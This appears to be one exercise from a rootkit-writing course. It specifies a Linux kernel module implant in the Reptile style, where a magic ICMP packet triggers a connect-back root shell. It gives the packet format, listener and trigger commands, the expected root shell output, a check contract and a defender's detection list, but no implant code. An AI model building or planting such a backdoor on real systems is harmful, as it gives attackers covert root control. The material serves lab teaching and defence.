# Capstone 4: Implant

Build a module that waits for a magic ICMP packet, then connects
back to the operator and executes commands. The Reptile pattern:
silent until triggered, one ping spawns a shell.

```
  host (operator)                        guest VM (implant)
  +---------------------------+          +---------------------------+
  |                           |          |  insmod hello.ko          |
  |  1. start listener        |          |     |                     |
  |  $ nc -l -p 4444          |          |     v                     |
  |                           |          |  netfilter hook (silent)  |
  |  2. send magic ICMP       |          |     |                     |
  |  $ ./icmp_send            |  ICMP    |     v                     |
  |    192.168.1.2             |--------->|  magic packet detected   |
  |    192.168.1.1 4444        |          |     |                     |
  |                           |          |     v                     |
  |  3. shell connects back   |  TCP     |  kthread: connect back   |
  |                           |<---------|     |                     |
  |  $ id                     |          |     v                     |
  |  uid=0(root)              |          |  recv cmd, exec, send    |
  |  $ uname -r               |          |  result via socket       |
  |  6.12.0                   |          |                          |
  |  $ exit                   |          |  close, wait for next    |
  +---------------------------+          +---------------------------+

  timeline:
  insmod    (silence)    ICMP ping    TCP connect    commands    exit
  ---|---------|-----------|------------|------------|---------|---->
                           trigger      shell         exec
```

## Prerequisites

Lings 00 through 51 (foundation through networking).

## What you are building

A kernel-space C2 agent, the Reptile pattern. The module sits silent
until a magic ICMP echo request arrives. The packet payload contains
the operator's IP and port. The module spawns a kthread that connects
back via a kernel TCP socket, receives commands, executes them with
`call_usermodehelper`, and sends results back.

- A netfilter hook inspects incoming ICMP packets (ling 45).
- A magic marker in the payload triggers activation.
- A kthread creates a TCP socket and connects to the operator (ling 48).
- Commands arrive newline-delimited, executed with `call_usermodehelper` (ling 16).
- Output is captured and sent back over the socket.
- On disconnect, the thread exits and waits for the next trigger.
- `/proc/rk_implant` shows connection state (for debugging, hidden in the real thing).

## The magic packet

The ICMP trigger carries the callback address in the payload:

```
  ICMP echo request
  +------------------+------------------+
  | marker (8 bytes) | IP:PORT (string) |
  | "ROOTKIT\x00"    | "10.0.2.2:4444"  |
  +------------------+------------------+
```

Use the provided `tools/icmp_send` to craft the packet:

```sh
# from the host:
./tools/icmp_send <vm-ip> <callback-ip> <callback-port>
```

## What "done" looks like

Terminal 1 (host, start listener):
```sh
nc -l -p 4444
```

Terminal 2 (host, send trigger):
```sh
./tools/icmp_send 192.168.1.2 192.168.1.1 4444
```

Terminal 1 (shell connects back):
```
id
uid=0(root) gid=0(root)
uname -r
6.12.0
exit
```

## What a defender sees

Everything leaks. This is the unarmored version.

```
lsmod                                        hello is listed
ps aux | grep hello                          kthread visible
ss -tlnp                                     TCP connection exposed
cat /proc/net/tcp                            socket in raw table
tcpdump -i eth0                              trigger packet in cleartext
```

The killer move: capture traffic on the HOST side, outside the VM.
No kernel rootkit can touch packets after they leave the guest NIC.

## Contract

The check script verifies:

- Module loads silently (no connections on start).
- `/proc/rk_implant` exists and shows `status: waiting`.
- After sending the magic ICMP packet, a TCP connection is established.
- Commands sent by the listener are executed.
- Output of `id` contains `uid=0`.
- Output of `uname -r` matches the running kernel.
- After disconnect, module returns to waiting state.
- `/proc/rk_implant` disappears after unload.

## Verify

```bash
./rootkitlings check capstone-4
```

## Hints

Only if stuck. Try without them first.
